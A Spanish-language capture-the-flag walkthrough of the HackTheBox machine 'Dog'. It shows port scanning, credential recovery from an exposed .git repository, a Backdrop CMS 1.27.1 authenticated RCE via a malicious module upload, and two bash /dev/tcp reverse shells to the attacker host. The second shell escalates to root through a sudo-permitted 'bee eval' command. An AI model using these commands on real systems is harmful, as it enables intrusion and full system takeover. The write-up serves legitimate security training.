# Tutorial de Dog de HackTheBox en Español

![Dog](../../img/Dog/Dog.png)

Empezaremos la máquina con un escaneo de todos los puertos **TCP**.

```
nmap -sS -Pn -p- -n --min-rate 5000 10.129.81.92

Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

Ahora, de los puertos abiertos (`22` y `80`) vamos a ver qué servicios están corriendo y que versiones.

```
nmap -sVC -p 22,80 --min-rate 5000 10.129.81.92

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 97:2a:d2:2c:89:8a:d3:ed:4d:ac:00:d2:1e:87:49:a7 (RSA)
|   256 27:7c:3c:eb:0f:26:e9:62:59:0f:0f:b1:38:c9:ae:2b (ECDSA)
|_  256 93:88:47:4c:69:af:72:16:09:4c:ba:77:1e:3b:3b:eb (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-generator: Backdrop CMS 1 (https://backdropcms.org)
|_http-title: Home | Dog
| http-git: 
|   10.129.81.92:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: todo: customize url aliases.  reference:https://docs.backdro...
| http-robots.txt: 22 disallowed entries (15 shown)
| /core/ /profiles/ /README.md /web.config /admin 
| /comment/reply /filter/tips /node/add /search /user/register 
|_/user/password /user/login /user/logout /?q=admin /?q=comment/reply
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

La máquina tiene un servicio `http` en el puerto `80` y un servicio `ssh` en el puerto `22`. También nos informa de que tiene un directorio `.git`, lo que podría exponer el código fuente.

Vamos a ejecutar un análisis básico del sitio web con `whatweb`, por si nos reporta alguna información que pueda sernos útil en el futuro.

```
whatweb 10.129.81.92

http://10.129.81.92 [200 OK] Apache[2.4.41], Content-Language[en], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.129.81.92], UncommonHeaders[x-backdrop-cache,x-generator], X-Frame-Options[SAMEORIGIN]
```

Una vez hecho un reconocimiento básico, vamos a adentrarnos en la página web desde el navegador.

![site](../../img/Dog/site.png)

Como en la página no encontramos nada interesante a primera vista, vamos a descargar el repositorio de Git desde la carpeta `/.git`. Para ello, utilizaremos la herramiente [git-dumper](https://github.com/arthaud/git-dumper).

```
git clone https://github.com/arthaud/git-dumper.git
cd git-dumper
```

Creamos un entorno virtual para instalar las dependencias.

```
python3 -m venv venv
venv/bin/pip install -r requirements.txt
```

Por último ejecutamos el script para que nos descargue el repositorio.

```
venv/bin/python3 git_dumper.py http://10.129.81.92/.git/ git
cd git
```

Inspeccionando el repositorio, encontramos el fichero `settings.php`, que contiene credenciales de una base de datos `MySQL`. Tomamos nota de esta credencial para utilizarla más adelante.

```
$database = 'mysql://root:BackDropJ2024DS2024@127.0.0.1/backdrop';
```

Volviendo a la página, encontramos un correo `support@dog.htb`.

![about](../../img/Dog/about.png)

Vamos a buscar en todo el repositorio si hay algún otro usuario del mismo dominio.

```
grep -rE ".+@dog.htb"

files/config_83dddd18e1ec67fd8ff5bba2453c7fb3/active/update.settings.json:        "tiffany@dog.htb"
```

Encontramos un usuario `tiffany@dog.htb`. Vamos a intentar autenticarnos en el CMS como este usuario con la contraseña que encontramos previamente.

![login](../../img/Dog/login.png)

Las credenciales son correctas, nos redirige a un dashboard para gestionar el CMS (backdrop).

![dashboard](../../img/Dog/dashboard.png)

Para ver la versión accedemos a la página `http://10.129.81.92/?q=admin/reports/status`, donde nos dice que la versión del CMS es `1.27.1`.

![version](../../img/Dog/version.png)

Buscando en Internet, encontramos que esta versión es vulnerable a RCE (Remote Code Execution) si estamos autenticados. La brecha reside en que no sanitiza bién el código `PHP`. El exploit se puede encontrar [aquí](https://www.exploit-db.com/exploits/52021).

```
python3 exploit.py http://10.129.81.92

Backdrop CMS 1.27.1 - Remote Command Execution Exploit
Evil module generating...
Evil module generated! shell.zip
Go to http://10.129.81.92/admin/modules/install and upload the shell.zip for Manual Installation.
Your shell address: http://10.129.81.92/modules/shell/shell.php
```

Al ejecutarlo, se genera una carpeta `shell` comprimida en `zip` y otra sin comprimir. Si intentamos subir el archivo comprimido en `zip`, nos dará un error indicando que usemos el formato `.tar.gz.`, por lo que la comprimiremos en este formato con el siguiente comando.

```
tar -czf shell.tar.gz shell
```

Ahora la subimos a la ruta que nos dice: `http://10.129.81.92/?q=admin/modules/install` (añadiendo la ruta al parámero `q` porque así maneja las rutas este sitio en concreto).

![install](../../img/Dog/install.png)

Hacemos click en `manual installation` y despues en `Upload a module, theme, or layout archive to install`. Seleccionamos el `shell.tar.gz` y pulsamos `INSTALL`.

![upload](../../img/Dog/upload.png)

Ya podemos ejecutar comandos, así que rápidamente (ya que el módulo se elimina automáticamente), nos ponemos en escucha con netcat en el puerto deseado:

```
nc -lnvp 1234
```

Y establecemos una reverse shell a través del módulo que acabamos de subir (`http://10.129.81.92/modules/shell/shell.php`) con el parametro `cmd` por get.

```
curl -X GET 'http://10.129.81.92/modules/shell/shell.php' -G --data-urlencode 'cmd=bash -c "bash -i >& /dev/tcp/10.10.14.191/1234 0>&1"'
```

Al ejecutarlo nos llega la **reverse shell** como el usuario `www-data`.

```
whoami

www-data
```

Vamos a listar todos los usuarios que tenga una `shell` asignada (que normalmente acaban en "sh").

```
cat /etc/passwd | grep -E "sh$"

root:x:0:0:root:/root:/bin/bash
jobert:x:1000:1000:jobert:/home/jobert:/bin/bash
johncusack:x:1001:1001:,,,:/home/johncusack:/bin/bash
```

Hay dos usuarios aparte de `root`. Intentando autenticarnos como ambos con la credencial que encontramos en el repositorio, tenemos éxito con el usuario `johncusack`.

```
su johncusack
Password: BackDropJ2024DS2024
```

Ya podemos acceder a la flag del usuario.

```
cd
cat user.txt
```

Vamos a listar qué comandos podemos ejecutar como otro usuario con `sudo`.

```
sudo -l

Matching Defaults entries for johncusack on dog:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User johncusack may run the following commands on dog:
    (ALL : ALL) /usr/local/bin/bee
```

Parece que podemos ejecutar el binario `bee` como cualquier usuario (incluido `root`).. Tras ejecutarlo sin argumentos y leer la ayuda del comando, damos con la opción `eval`, que permite ejecutar cualquier codigo **php**.

```
eval
   ev, php-eval
   Evaluate (run/execute) arbitrary PHP code after bootstrapping Backdrop.
```

Con esta opción, ejecutar comandos como `root` ya es cuestión de hacer un código `PHP` que llame a cualquier comando del sistema que desees. Estableceremos, por ejemplo, otra **reverse shell**, por lo que nos ponemos en escucha en nuestra máquina local en cualquier puerto.

```
nc -lnvp 4321
```

Y ejecutamos `bee` como `root` con la opción `eval` (o `ev`) y el código `PHP` para mandarnos una **reverse shell** a nuestra máquina local.

```
sudo /usr/local/bin/bee --root=/var/www/html ev "exec('bash -c \"bash -i >& /dev/tcp/10.10.14.191/4321 0>&1\"')"
```

Tras ejecutarlo, si miramos el netcat, ya nos debería haber llegado la **reverse shell** como root.

```
whoami

root
```

Por lo que ya podemos leer la flag de `root` y finalizar la máquina `Dog`.

```
cd
cat root.txt
```

Si te ha parecido útil, considera dejar una estrella al proyecto. Gracias y mucha suerte en tus próximas máquinas ❤️.